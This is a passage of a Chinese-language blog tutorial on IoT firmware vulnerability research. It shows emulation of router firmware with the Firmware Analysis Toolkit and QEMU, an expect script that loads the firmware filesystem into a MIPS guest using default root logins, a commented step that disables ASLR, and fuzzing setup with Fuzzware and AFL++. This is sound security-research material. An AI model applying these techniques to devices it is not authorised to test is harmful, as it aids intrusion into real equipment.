class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./fat.py \u0026lt;firmware file\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ ./fat.py DIR-601_REVB_FIRMWARE_2.01.BIN \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                               __           _   \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                              / _\u003cspan class=\"p\"\u003e|\u003c/span\u003e         \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                             \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e_    __ _  \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e_ \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                             \u003cspan class=\"p\"\u003e|\u003c/span\u003e  _\u003cspan class=\"p\"\u003e|\u003c/span\u003e  / _\u003cspan class=\"sb\"\u003e`\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e __\u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                             \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e_\u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e_ \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                             \u003cspan class=\"p\"\u003e|\u003c/span\u003e_\u003cspan class=\"p\"\u003e|\u003c/span\u003e    \u003cspan class=\"se\"\u003e\\_\u003c/span\u003e_,_\u003cspan class=\"p\"\u003e|\u003c/span\u003e  \u003cspan class=\"se\"\u003e\\_\u003c/span\u003e_\u003cspan class=\"p\"\u003e|\u003c/span\u003e                    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                Welcome to the Firmware Analysis Toolkit - v0.3\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    Offensive IoT Exploitation Training http://bit.do/offensiveiotexploitation\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                  By Attify - https://attify.com  \u003cspan class=\"p\"\u003e|\u003c/span\u003e @attifyme\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Firmware: DIR-601_REVB_FIRMWARE_2.01.BIN\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Extracting the firmware...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Image ID: \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Identifying architecture...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Architecture: mipseb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Building QEMU disk image...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Setting up the network connection, please standby...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Network interfaces: \u003cspan class=\"o\"\u003e[(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;br0\u0026#39;\u003c/span\u003e, \u003cspan class=\"s1\"\u003e\u0026#39;192.168.0.1\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e All set! Press ENTER to run the firmware...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e When running, press Ctrl + A X to terminate qemu\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\n\n\n\n\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" src=\"https://s2.loli.net/2024/02/25/5vn4FhxHLXNaVkY.png\" alt=\"image-20240223021726180\" /\u003e\n    \n  \u003c/figure\u003e\n\n\u003c/p\u003e\n\u003cdiv id=\"qemu\" class=\"anchor\"\u003e\u003c/div\u003e\n\u003ch3 class=\"relative group\"\u003eQEMU \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#qemu\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\u003c/span\u003e        \n    \n\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://wokough.gitbook.io/iot-firmware-aio/wiki/fang-zhen-fen-xi#id-1.1-qemu\"   target=\"_blank\"\u003e\n    https://wokough.gitbook.io/iot-firmware-aio/wiki/fang-zhen-fen-xi#id-1.1-qemu\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e具体问题具体分析\u003c/p\u003e\n\u003cp\u003e具体固件使用对应的命令进行仿真\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e先上网搜索相关信息，看看有没有文章已经仿真过了\u003c/li\u003e\n\u003cli\u003e参考之前仿真设备的案例来试着仿真\u003c/li\u003e\n\u003cli\u003e如果都没有就需要我们参考着官方文档以及对固件的静态分析来自己调整命令\n\u003cul\u003e\n\u003cli\u003e如果遇到一些参数实在没有办法满足时可以先跑起来\u003c/li\u003e\n\u003cli\u003e在动态调试的过程看是哪个汇编执行报错\n\u003cul\u003e\n\u003cli\u003e再在IDA中进行合适的patch来使得固件可以成功仿真\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e例如当我们需要向\u003ccode\u003emain\u003c/code\u003e函数传递参数\u003ccode\u003eargv\u003c/code\u003e和设置环境变量时，可以先看看官方usage：\u003c/p\u003e\n\u003cp\u003e\n\n\n\n\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" src=\"https://s2.loli.net/2024/02/25/apCn8t9zLSGwFbK.png\" alt=\"image-20240224180845930\" /\u003e\n    \n  \u003c/figure\u003e\n\n\u003c/p\u003e\n\u003cp\u003e发现我们可以用\u003ccode\u003e-0\u003c/code\u003e选项传递第一个参数，用\u003ccode\u003e-E\u003c/code\u003e选项设置环境变量，用\u003ccode\u003e-L\u003c/code\u003e选项做到类似于更改根目录的效果，用\u003ccode\u003e-strace\u003c/code\u003e选项追踪程序执行时进程系统调用和所接收的信号，方便调试\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e部分固件的仿真需要我们使用qemu来配置网络\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e可以先拍一个快照再来开始仿真，便于会快照重新配置\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e参考\u003ca href=\"https://github.com/Vu1nT0tal/IoT-vulhub/tree/master/HUAWEI/CVE-2017-17215\"   target=\"_blank\"\u003e\n    IoT-vulhub\u003c/a\u003e项目网络配置的方法，可以得到一个配置网络的shell文件模版\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 启动 ssh 服务\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/etc/init.d/ssh start\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 配置网卡\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etunctl -t tap0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eifconfig tap0 192.168.2.1/24\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 启动 http 服务\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enohup python3 -m http.server \u003cspan class=\"m\"\u003e8000\u003c/span\u003e 1\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e/dev/null \u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 进入 qemu 镜像目录\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /root/images\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/bin/expect\u003cspan class=\"s\"\u003e\u0026lt;\u0026lt;EOF\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eset timeout 10000\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e# 依照固件及qemu文档更改此处命令\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003espawn qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mips_standard.qcow2 -append \u0026#34;root=/dev/sda1 console=tty0\u0026#34; -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eexpect \u0026#34;debian-mips login:\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esend \u0026#34;root\\r\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eexpect \u0026#34;Password:\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esend \u0026#34;root\\r\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eexpect \u0026#34;root@debian-mips:~# \u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esend \u0026#34;ifconfig eth0 192.168.2.2/24\\r\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e#expect \u0026#34;root@debian-mips:~# \u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e#send \u0026#34;echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space\\r\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eexpect \u0026#34;root@debian-mips:~# \u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esend \u0026#34;scp root@192.168.2.1:/root/squashfs-root.tar.gz /root/squashfs-root.tar.gz\\r\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eexpect {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    \u0026#34;(yes/no)? \u0026#34; { send \u0026#34;yes\\r\u0026#34;; exp_continue }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    \u0026#34;password: \u0026#34; { send \u0026#34;root\\r\u0026#34; }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eexpect \u0026#34;root@debian-mips:~# \u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esend \u0026#34;tar xzf squashfs-root.tar.gz \u0026amp;\u0026amp; rm squashfs-root.tar.gz\\r\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eexpect \u0026#34;root@debian-mips:~# \u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esend \u0026#34;mount -o bind /dev ./squashfs-root/dev \u0026amp;\u0026amp; mount -t proc /proc ./squashfs-root/proc\\r\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eexpect \u0026#34;root@debian-mips:~# \u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esend \u0026#34;scp -r root@192.168.2.1:/root/tools /root/squashfs-root/tools\\r\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eexpect {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    \u0026#34;(yes/no)? \u0026#34; { send \u0026#34;yes\\r\u0026#34;; exp_continue }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    \u0026#34;password: \u0026#34; { send \u0026#34;root\\r\u0026#34; }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eexpect \u0026#34;root@debian-mips:~# \u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esend \u0026#34;echo \u0026#39;sleep 30\u0026#39; \u0026gt; net.sh\\r\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eexpect \u0026#34;root@debian-mips:~# \u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esend \u0026#34;echo \u0026#39;ifconfig eth0 192.168.2.2/24\u0026#39; \u0026gt;\u0026gt; net.sh\\r\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eexpect \u0026#34;root@debian-mips:~# \u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esend \u0026#34;echo \u0026#39;ifconfig br0 192.168.2.3/24\u0026#39; \u0026gt;\u0026gt; net.sh\\r\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eexpect \u0026#34;root@debian-mips:~# \u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esend \u0026#34;chmod +x net.sh \u0026amp;\u0026amp; /bin/sh net.sh \u0026amp;\\r\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eexpect \u0026#34;root@debian-mips:~# \u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esend \u0026#34;chroot squashfs-root/ sh\\r\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eexpect \u0026#34;# \u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esend \u0026#34;./bin/upnp\\r\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eexpect \u0026#34;# \u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esend \u0026#34;./bin/mic\\r\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eexpect eof\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv id=\"0x04-fuzz\" class=\"anchor\"\u003e\u003c/div\u003e\n\u003ch2 class=\"relative group\"\u003e0x04 fuzz \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#0x04-fuzz\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003e动态分析\u003c/strong\u003e查找漏洞时主要通过各类fuzz工具来得到漏洞的触发点\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e主要使用FirmAFL、FirmFuzz、Fuzzware工具来进行fuzz\u003c/li\u003e\n\u003cli\u003e也可以使用afl与afl++\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv id=\"fuzzware\" class=\"anchor\"\u003e\u003c/div\u003e\n\u003ch3 class=\"relative group\"\u003eFuzzware \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#fuzzware\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\u003c/span\u003e        \n    \n\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/fuzzware-fuzzer/fuzzware\"   target=\"_blank\"\u003e\n    fuzzware-fuzzer/fuzzware: Fuzzware\u0026rsquo;s main repository. Start here to install. (github.com)\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/fuzzware-fuzzer/fuzzware.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo ./build_docker.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo ./run_docker.sh examples fuzzware pipeline --skip-afl-cpufreq pw-recovery/ARCH_PRO\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo ./run_docker.sh \u003cspan class=\"nb\"\u003etest\u003c/span\u003e fuzzware pipeline --skip-afl-cpufreq .\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e成功将固件跑起来：\u003c/p\u003e\n\u003cp\u003e\n\n\n\n\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" src=\"https://s2.loli.net/2024/02/25/krvpGM6NwIgKcLs.png\" alt=\"image-20240202005856817\" /\u003e\n    \n  \u003c/figure\u003e\n\n\u003c/p\u003e\n\u003cp\u003e由图可以看到刚开始运行时发现新的MMIO寄存器模型，由于MMIO Access Model中并不存在，因此会将其定义为新的模型，然后继续向下运行\u003c/p\u003e\n\u003cp\u003e\n\n\n\n\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" src=\"https://s2.loli.net/2024/02/25/PunMRS4qrwWbN93.png\" alt=\"image-20240202010428350\" /\u003e\n    \n  \u003c/figure\u003e\n\n\u003c/p\u003e\n\u003cp\u003e建模完毕后，开始进行正常的fuzzing阶段：\u003c/p\u003e\n\u003cp\u003e\n\n\n\n\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" src=\"https://s2.loli.net/2024/02/25/MnVkI6tiX5OAKlC.png\" alt=\"image-20240202011901838\" /\u003e\n    \n  \u003c/figure\u003e\n\n\u003c/p\u003e\n\u003cp\u003e每一轮fuzzing结束后，根据反馈调整输入，开始下一阶段fuzzing：\u003c/p\u003e\n\u003cp\u003e\n\n\n\n\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" src=\"https://s2.loli.net/2024/02/25/7p9AVbuitzjJGg5.png\" alt=\"image-20240202010524792\" /\u003e\n    \n  \u003c/figure\u003e\n\n\u003c/p\u003e\n\u003cdiv id=\"afl\" class=\"anchor\"\u003e\u003c/div\u003e\n\u003ch3 class=\"relative group\"\u003eafl++ \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 